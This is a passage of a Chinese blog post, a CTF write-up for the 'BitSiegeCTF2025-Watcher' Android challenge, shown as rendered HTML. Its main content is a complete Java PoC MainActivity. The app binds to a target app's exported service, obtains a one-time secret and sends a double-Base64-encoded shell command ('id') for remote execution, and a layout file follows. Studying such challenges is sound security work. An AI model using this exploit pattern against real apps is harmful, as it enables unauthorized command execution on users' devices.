class="type">String</span> <span class="variable">KEY_SECRET</span> <span class="operator">=</span> <span class="string">&quot;secret&quot;</span>;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEY_COMMAND</span> <span class="operator">=</span> <span class="string">&quot;command&quot;</span>;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEY_REPLY</span> <span class="operator">=</span> <span class="string">&quot;reply&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">Messenger</span> <span class="variable">mServiceMessenger</span> <span class="operator">=</span> <span class="literal">null</span>; <span class="comment">// Sends messages to target service  </span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">mIsBound</span> <span class="operator">=</span> <span class="literal">false</span>;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">mReceivedSecret</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Receives replies from target service  </span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Messenger</span> <span class="variable">mReplyMessenger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Messenger</span>(<span class="keyword">new</span> <span class="title class_">ReplyHandler</span>(Looper.getMainLooper()));  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> Button buttonRun;  </span><br><span class="line">    <span class="keyword">private</span> TextView textOutput;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Handles replies from WatcherService  </span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">ReplyHandler</span> <span class="keyword">extends</span> <span class="title class_">Handler</span> &#123;  </span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">ReplyHandler</span><span class="params">(Looper looper)</span> &#123; <span class="built_in">super</span>(looper); &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleMessage</span><span class="params">(Message msg)</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">reply</span> <span class="operator">=</span> msg.getData() != <span class="literal">null</span> ? msg.getData().getString(KEY_REPLY) : <span class="literal">null</span>;  </span><br><span class="line">            Log.d(TAG, <span class="string">&quot;Reply received: what=&quot;</span> + msg.what + <span class="string">&quot;, reply=&quot;</span> + reply);  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">switch</span> (msg.what) &#123;  </span><br><span class="line">                <span class="keyword">case</span> MSG_GET_SECRET:  </span><br><span class="line">                    <span class="keyword">if</span> (reply != <span class="literal">null</span> &amp;&amp; !reply.startsWith(<span class="string">&quot;Error&quot;</span>)) &#123;  </span><br><span class="line">                        mReceivedSecret = reply;  </span><br><span class="line">                        textOutput.append(<span class="string">&quot;\nSecret received: &quot;</span> + mReceivedSecret);  </span><br><span class="line">                        <span class="comment">// Now send the command  </span></span><br><span class="line">                        sendCommand();  </span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                        textOutput.append(<span class="string">&quot;\nError getting secret: &quot;</span> + reply);  </span><br><span class="line">                        Log.e(TAG, <span class="string">&quot;Failed to get secret: &quot;</span> + reply);  </span><br><span class="line">                        buttonRun.setEnabled(<span class="literal">true</span>); </span><br><span class="line">                    &#125;  </span><br><span class="line">                    <span class="keyword">break</span>;  </span><br><span class="line">                <span class="keyword">case</span> MSG_RUN_COMMAND:  </span><br><span class="line">                    textOutput.append(<span class="string">&quot;\nCommand Output:\n&quot;</span> + reply);  </span><br><span class="line">                    Log.i(TAG, <span class="string">&quot;Command output received.&quot;</span>);  </span><br><span class="line">                    buttonRun.setEnabled(<span class="literal">true</span>); </span><br><span class="line">                    <span class="keyword">break</span>;  </span><br><span class="line">                <span class="keyword">default</span>:  </span><br><span class="line">                    <span class="built_in">super</span>.handleMessage(msg);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Connects/disconnects from WatcherService  </span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ServiceConnection</span> <span class="variable">mConnection</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServiceConnection</span>() &#123;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onServiceConnected</span><span class="params">(ComponentName name, IBinder service)</span> &#123;  </span><br><span class="line">            mServiceMessenger = <span class="keyword">new</span> <span class="title class_">Messenger</span>(service);  </span><br><span class="line">            mIsBound = <span class="literal">true</span>;  </span><br><span class="line">            buttonRun.setEnabled(<span class="literal">true</span>);  </span><br><span class="line">            textOutput.setText(<span class="string">&quot;Service Connected. Ready.&quot;</span>);  </span><br><span class="line">            Log.i(TAG, <span class="string">&quot;Watcher Service connected.&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onServiceDisconnected</span><span class="params">(ComponentName name)</span> &#123;  </span><br><span class="line">            mServiceMessenger = <span class="literal">null</span>;  </span><br><span class="line">            mIsBound = <span class="literal">false</span>;  </span><br><span class="line">            buttonRun.setEnabled(<span class="literal">false</span>);  </span><br><span class="line">            textOutput.setText(<span class="string">&quot;Service Disconnected.&quot;</span>);  </span><br><span class="line">            Log.w(TAG, <span class="string">&quot;Watcher Service disconnected.&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;  </span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);  </span><br><span class="line">        setContentView(R.layout.activity_main);  </span><br><span class="line">  </span><br><span class="line">        buttonRun = findViewById(R.id.button_run);  </span><br><span class="line">        textOutput = findViewById(R.id.text_output);  </span><br><span class="line">  </span><br><span class="line">        buttonRun.setEnabled(<span class="literal">false</span>);  </span><br><span class="line">        buttonRun.setOnClickListener(v -&gt; startExploit());  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onStart</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="built_in">super</span>.onStart();  </span><br><span class="line">        textOutput.setText(<span class="string">&quot;Binding to Watcher Service...&quot;</span>);  </span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();  </span><br><span class="line">        intent.setComponent(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(TARGET_PACKAGE, TARGET_SERVICE));  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            bindService(intent, mConnection, Context.BIND_AUTO_CREATE);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            textOutput.setText(<span class="string">&quot;Error binding: &quot;</span> + e.getMessage() + <span class="string">&quot;\nIs Watcher installed?&quot;</span>);  </span><br><span class="line">            Log.e(TAG, <span class="string">&quot;Error binding&quot;</span>, e);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onStop</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="built_in">super</span>.onStop();  </span><br><span class="line">        <span class="keyword">if</span> (mIsBound) &#123;  </span><br><span class="line">            unbindService(mConnection);  </span><br><span class="line">            mIsBound = <span class="literal">false</span>;  </span><br><span class="line">            mServiceMessenger = <span class="literal">null</span>;  </span><br><span class="line">            buttonRun.setEnabled(<span class="literal">false</span>);  </span><br><span class="line">            Log.d(TAG, <span class="string">&quot;Unbound from service.&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// --- Exploit Steps ---  </span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">startExploit</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">if</span> (!mIsBound) &#123;  </span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Service not bound&quot;</span>, Toast.LENGTH_SHORT).show();  </span><br><span class="line">            <span class="keyword">return</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        buttonRun.setEnabled(<span class="literal">false</span>); </span><br><span class="line">        textOutput.setText(<span class="string">&quot;Requesting secret...&quot;</span>);  </span><br><span class="line">        mReceivedSecret = <span class="literal">null</span>; <span class="comment">// Reset previous secret  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 1. Request the secret        </span></span><br><span class="line">         <span class="type">Message</span> <span class="variable">getSecretMsg</span> <span class="operator">=</span> Message.obtain(<span class="literal">null</span>, MSG_GET_SECRET);  </span><br><span class="line">        getSecretMsg.replyTo = mReplyMessenger;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            mServiceMessenger.send(getSecretMsg);  </span><br><span class="line">            Log.d(TAG, <span class="string">&quot;Sent MSG_GET_SECRET&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;  </span><br><span class="line">            textOutput.setText(<span class="string">&quot;Error sending get_secret: &quot;</span> + e.getMessage());  </span><br><span class="line">            Log.e(TAG, <span class="string">&quot;Failed to send MSG_GET_SECRET&quot;</span>, e);  </span><br><span class="line">            buttonRun.setEnabled(<span class="literal">true</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">sendCommand</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">if</span> (!mIsBound || mReceivedSecret == <span class="literal">null</span>) &#123;  </span><br><span class="line">            textOutput.append(<span class="string">&quot;\nCannot send command (not bound or no secret)&quot;</span>);  </span><br><span class="line">            Log.e(TAG, <span class="string">&quot;sendCommand called but not ready (bound=&quot;</span> + mIsBound + <span class="string">&quot;, secret=&quot;</span> + mReceivedSecret + <span class="string">&quot;)&quot;</span>);  </span><br><span class="line">            buttonRun.setEnabled(<span class="literal">true</span>);  </span><br><span class="line">            <span class="keyword">return</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        textOutput.append(<span class="string">&quot;\nSending &#x27;id&#x27; command...&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 2. Prepare the command  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;id&quot;</span>;   </span><br><span class="line">        <span class="type">String</span> <span class="variable">doubleEncodedCommand</span> <span class="operator">=</span> doubleEncodeBase64(command);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (doubleEncodedCommand == <span class="literal">null</span>) &#123;  </span><br><span class="line">            textOutput.append(<span class="string">&quot;\nError: Failed to Base64 encode command.&quot;</span>);  </span><br><span class="line">            Log.e(TAG, <span class="string">&quot;Double Base64 encoding failed&quot;</span>);  </span><br><span class="line">            buttonRun.setEnabled(<span class="literal">true</span>);  </span><br><span class="line">            <span class="keyword">return</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 3. Send the command message  </span></span><br><span class="line">        <span class="type">Message</span> <span class="variable">runCmdMsg</span> <span class="operator">=</span> Message.obtain(<span class="literal">null</span>, MSG_RUN_COMMAND);  </span><br><span class="line">        <span class="type">Bundle</span> <span class="variable">bundle</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bundle</span>();  </span><br><span class="line">        bundle.putString(KEY_SECRET, mReceivedSecret);  </span><br><span class="line">        bundle.putString(KEY_COMMAND, doubleEncodedCommand); <span class="comment">// Use the encoded command  </span></span><br><span class="line">        runCmdMsg.setData(bundle);  </span><br><span class="line">        runCmdMsg.replyTo = mReplyMessenger;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            mServiceMessenger.send(runCmdMsg);  </span><br><span class="line">            Log.d(TAG, <span class="string">&quot;Sent MSG_RUN_COMMAND&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;  </span><br><span class="line">            textOutput.append(<span class="string">&quot;\nError sending command: &quot;</span> + e.getMessage());  </span><br><span class="line">            Log.e(TAG, <span class="string">&quot;Failed to send MSG_RUN_COMMAND&quot;</span>, e);  </span><br><span class="line">            buttonRun.setEnabled(<span class="literal">true</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">doubleEncodeBase64</span><span class="params">(String input)</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">byte</span>[] singleEncoded = Base64.getEncoder().encode(input.getBytes(StandardCharsets.UTF_8));  </span><br><span class="line">            <span class="type">byte</span>[] doubleEncoded = Base64.getEncoder().encode(singleEncoded);  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(doubleEncoded, StandardCharsets.UTF_8);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            Log.e(TAG, <span class="string">&quot;Base64 encoding failed&quot;</span>, e);  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对应的activity_main.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span>  </span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span>  </span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>  </span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span>  </span></span><br><span class="line"><span class="tag">    <span class="attr">android:padding</span>=<span class="string">&quot;16dp&quot;</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span>        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button_run&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;Run &#x27;id&#x27; command on Watcher&quot;</span> /&gt;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span>        <span class="attr">android:id</span>=<span class="string">&quot;@+id/text_output&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">&quot;16dp&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;Output will appear here...&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:textAppearance</span>=<span class="string">&quot;@style/TextAppearance.AppCompat.Medium&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:textIsSelectable</span>=<span class="string">&quot;true&quot;</span>/&gt;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test1/Pasted%20image%2020250506124027.png"
+                       
+                 ></p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                BitSiegeCTF2025-Watcher
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2025/05/06/BitSiegeCTF2025-Watcher/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">arch3rn4r</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2025-05-06 14:28</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到 QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="分享到微信"
+            data-tooltip-img-tip="微信扫一扫"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到微博"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/05/02/hello-world/"
+                                   title="Hello World"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">Hello World</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;评论
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">评论插件加载失败</span>
+    <button class="reload keep-button">点击重新加载</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">正在加载评论插件</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
+
+        
+            
+
+    <div class="giscus-comments-container">
+        <div class="giscus" id="giscus"></div>
+        <script 
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        >
+          if (!window.KeepCommentPlugin?.getGiscusTheme) {
+            window.KeepCommentPlugin.getGiscusTheme = () => {
+              return document.documentElement.classList.contains('dark-mode') ? 'dark_dimmed' : 'light_tritanopia'
+            }
+          }
+
+          if (!window.KeepCommentPlugin?.changeGiscusTheme) {
+            window.KeepCommentPlugin.changeGiscusTheme = () => {
+              const iframe = document.querySelector('iframe.giscus-frame')
+              iframe && iframe.contentWindow.postMessage({
+                giscus: {
+                  setConfig: {
+                    theme: window.KeepCommentPlugin.getGiscusTheme()
+                  }
+                }
+              }, 'https://giscus.app')
+            }
+          }
+
+          if (!window.KeepCommentPlugin?.initGiscus) {
+            window.KeepCommentPlugin.initGiscus = () => {
+              const script = document.createElement('script')
+              script.async = true
+              script.src = 'https://giscus.app/client.js'
+              script.setAttribute('data-repo', 'arch3rn4r/arch3rn4r.github.io')
+              script.setAttribute('data-repo-id', 'R_kgDOLnMFhw')
+              script.setAttribute('data-category', 'Announcements')
+              script.setAttribute('data-category-id', 'DIC_kwDOLnMFh84Cik-D')
+              script.setAttribute('data-reactions-enabled', '0')
+              script.setAttribute('data-lang', 'zh-CN')
+              script.setAttribute('data-mapping', 'pathname')
+              script.setAttribute('data-strict', '0')
+              script.setAttribute('data-emit-metadata', '0')
+              script.setAttribute('data-input-position', 'top')
+              script.setAttribute('crossorigin', 'anonymous')
+              script.setAttribute('loading', 'lazy')
+              script.setAttribute('data-theme', window.KeepCommentPlugin.getGiscusTheme())
+              document.querySelector('.giscus-comments-container').appendChild(script)
+              script.onerror = () => {
+                window.KeepCommentPlugin.loadFailHandle()
+              }
+              script.onload = () => {
+                window.KeepCommentPlugin.hideLoading()
+              }
+              const toggleThemeBtn = document.querySelector('.tool-toggle-theme-mode')
+              toggleThemeBtn && toggleThemeBtn.addEventListener('click', () => {
+                window.KeepCommentPlugin.changeGiscusTheme()
+              })
+            }
+          }
+
+          if ('false' === "true") {
+            setTimeout(() => {
+              window.KeepCommentPlugin.initGiscus()
+            }, 1000)
+          } else {
+            window.addEventListener("DOMContentLoaded", window.KeepCommentPlugin.initGiscus)
+          }
+        </script>
+    </div>
+
+
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc left-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E5%88%86%E6%9E%90"><span class="nav-text">前置分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%96%E5%86%99poc"><span class="nav-text">编写poc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9E%E6%8E%A5service"><span class="nav-text">连接service</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%84%E7%90%86%E4%B8%80%E6%AC%A1%E6%80%A7secret"><span class="nav-text">处理一次性secret</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%91%E9%80%81%E6%8C%87%E4%BB%A4"><span class="nav-text">发送指令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4%E7%9A%84MainActivity-java"><span class="nav-text">完整的MainActivity.java</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+        &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2025
+        
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">arch3rn4r</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">78.1k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools left-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+            <li class="tools-item rss flex-center">
+                <a class="flex-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                    <i class="fas fa-rss"></i>
+                </a>
+            </li>
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
